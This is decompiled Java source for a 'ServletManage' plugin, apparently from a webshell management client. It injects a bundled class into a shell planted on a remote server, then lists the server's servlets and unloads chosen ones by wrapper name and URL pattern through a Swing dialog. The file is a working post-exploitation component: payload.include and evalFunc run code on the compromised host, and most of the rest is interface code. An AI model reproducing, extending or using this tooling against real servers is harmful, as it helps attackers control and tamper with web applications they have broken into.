package shells.plugins.java;

import core.Encoding;
import core.annotation.PluginnAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.GBC;
import core.ui.component.RTextArea;
import java.awt.BorderLayout;
import java.awt.Dimension;
import java.awt.Frame;
import java.awt.GridBagLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ComponentAdapter;
import java.awt.event.ComponentEvent;
import java.awt.event.WindowEvent;
import java.awt.event.WindowListener;
import java.io.InputStream;
import javax.swing.JButton;
import javax.swing.JDialog;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTextField;
import util.Log;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;

@PluginnAnnotation(
   payloadName = "JavaDynamicPayload",
   Name = "ServletManage"
)
public class ServletManage implements Plugin {
   private static final String CLASS_NAME = "plugin.ServletManage";
   private JPanel panel = new JPanel(new BorderLayout());
   private JButton getAllServletButton = new JButton("GetAllServlet");
   private JButton unLoadServletButton = new JButton("UnLoadServlet");
   private JSplitPane splitPane = new JSplitPane();
   private RTextArea resultTextArea = new RTextArea();
   private boolean loadState;
   private ShellEntity shellEntity;
   private Payload payload;
   private Encoding encoding;

   public ServletManage() {
      this.splitPane.setOrientation(0);
      this.splitPane.setDividerSize(0);
      JPanel topPanel = new JPanel();
      topPanel.add(this.getAllServletButton);
      topPanel.add(this.unLoadServletButton);
      this.splitPane.setTopComponent(topPanel);
      this.splitPane.setBottomComponent(new JScrollPane(this.resultTextArea));
      this.splitPane.addComponentListener(new ComponentAdapter() {
         public void componentResized(ComponentEvent e) {
            ServletManage.this.splitPane.setDividerLocation(0.15D);
         }
      });
      this.panel.add(this.splitPane);
   }

   private void getAllServletButtonClick(ActionEvent actionEvent) {
      this.resultTextArea.setText(this.getAllServlet());
   }

   private void unLoadServletButtonClick(ActionEvent actionEvent) {
      ServletManage.UnServlet unServlet = (new ServletManage.UnLoadServletDialog(this.shellEntity.getFrame(), "UnLoadServlet", "", "", (ServletManage.UnLoadServletDialog)null)).getResult();
      if (unServlet.state) {
         String resultString = this.unLoadServlet(unServlet.wrapperName, unServlet.urlPattern);
         Log.log(resultString);
         JOptionPane.showMessageDialog(this.panel, resultString, "提示", 1);
      } else {
         Log.log("用户取消选择.....");
      }

   }

   private void load() {
      if (!this.loadState) {
         try {
            InputStream inputStream = this.getClass().getResourceAsStream("assets/ServletManage.class");
            byte[] data = functions.readInputStream(inputStream);
            inputStream.close();
            if (this.payload.include("plugin.ServletManage", data)) {
               this.loadState = true;
               Log.log("Load success");
            } else {
               Log.log("Load fail");
            }
         } catch (Exception var3) {
            Log.error(var3);
         }
      }

   }

   private String getAllServlet() {
      this.load();
      byte[] resultByteArray = this.payload.evalFunc("plugin.ServletManage", "getAllServlet", new ReqParameter());
      return this.encoding.Decoding(resultByteArray);
   }

   private String unLoadServlet(String wrapperName, String urlPattern) {
      this.load();
      ReqParameter reqParameter = new ReqParameter();
      reqParameter.add("wrapperName", wrapperName);
      reqParameter.add("urlPattern", urlPattern);
      byte[] resultByteArray = this.payload.evalFunc("plugin.ServletManage", "unLoadServlet", reqParameter);
      return this.encoding.Decoding(resultByteArray);
   }

   public void init(ShellEntity shellEntity) {
      this.shellEntity = shellEntity;
      this.payload = this.shellEntity.getPayloadModel();
      this.encoding = Encoding.getEncoding(this.shellEntity);
      automaticBindClick.bindJButtonClick(this, this);
   }

   public JPanel getView() {
      return this.panel;
   }

   class UnLoadServletDialog extends JDialog {
      private JTextField wrapperNameTextField;
      private JTextField urlPatternTextField;
      private JLabel wrapperNameLabel;
      private JLabel urlPatternLabel;
      private JButton okButton;
      private JButton cancelButton;
      private ServletManage.UnServlet unServlet;
      private Dimension TextFieldDim;

      private UnLoadServletDialog(Frame frame, String tipString, String wrapperNameString, String urlPatternString) {
         super(frame, tipString, true);
         this.TextFieldDim = new Dimension(500, 23);
         this.unServlet = ServletManage.this.new UnServlet();
         this.wrapperNameTextField = new JTextField("wrapperNameText", 30);
         this.urlPatternTextField = new JTextField("destText", 30);
         this.wrapperNameLabel = new JLabel("wrapperName");
         this.urlPatternLabel = new JLabel("urlPattern");
         this.okButton = new JButton("unLoad");
         this.cancelButton = new JButton("cancel");
         Dimension TextFieldDim = new Dimension(200, 23);
         GBC gbcLSrcFile = (new GBC(0, 0)).setInsets(5, -40, 0, 0);
         GBC gbcSrcFile = (new GBC(1, 0, 3, 1)).setInsets(5, 20, 0, 0);
         GBC gbcLDestFile = (new GBC(0, 1)).setInsets(5, -40, 0, 0);
         GBC gbcDestFile = (new GBC(1, 1, 3, 1)).setInsets(5, 20, 0, 0);
         GBC gbcOkButton = (new GBC(0, 2, 2, 1)).setInsets(5, 20, 0, 0);
         GBC gbcCancelButton = (new GBC(2, 2, 1, 1)).setInsets(5, 20, 0, 0);
         this.wrapperNameTextField.setPreferredSize(TextFieldDim);
         this.urlPatternTextField.setPreferredSize(TextFieldDim);
         this.setLayout(new GridBagLayout());
         this.add(this.wrapperNameLabel, gbcLSrcFile);
         this.add(this.wrapperNameTextField, gbcSrcFile);
         this.add(this.urlPatternLabel, gbcLDestFile);
         this.add(this.urlPatternTextField, gbcDestFile);
         this.add(this.okButton, gbcOkButton);
         this.add(this.cancelButton, gbcCancelButton);
         automaticBindClick.bindJButtonClick(this, this);
         this.addWindowListener(new WindowListener() {
            public void windowOpened(WindowEvent paramWindowEvent) {
            }

            public void windowIconified(WindowEvent paramWindowEvent) {
            }

            public void windowDeiconified(WindowEvent paramWindowEvent) {
            }

            public void windowDeactivated(WindowEvent paramWindowEvent) {
            }

            public void windowClosing(WindowEvent paramWindowEvent) {
               UnLoadServletDialog.this.cancelButtonClick((ActionEvent)null);
            }

            public void windowClosed(WindowEvent paramWindowEvent) {
            }

            public void windowActivated(WindowEvent paramWindowEvent) {
            }
         });
         this.wrapperNameTextField.setText(wrapperNameString);
         this.urlPatternTextField.setText(urlPatternString);
         this.setSize(650, 180);
         this.setLocationRelativeTo(frame);
         this.setDefaultCloseOperation(2);
         this.setVisible(true);
      }

      public ServletManage.UnServlet getResult() {
         return this.unServlet;
      }

      private void okButtonClick(ActionEvent actionEvent) {
         this.unServlet.state = true;
         this.changeFileInfo();
      }

      private void cancelButtonClick(ActionEvent actionEvent) {
         this.unServlet.state = false;
         this.changeFileInfo();
      }

      private void changeFileInfo() {
         this.unServlet.urlPattern = this.urlPatternTextField.getText();
         this.unServlet.wrapperName = this.wrapperNameTextField.getText();
         this.dispose();
      }

      // $FF: synthetic method
      UnLoadServletDialog(Frame var2, String var3, String var4, String var5, ServletManage.UnLoadServletDialog var6) {
         this(var2, var3, var4, var5);
      }
   }

   class UnServlet {
      public boolean state;
      public String wrapperName;
      public String urlPattern;
   }
}
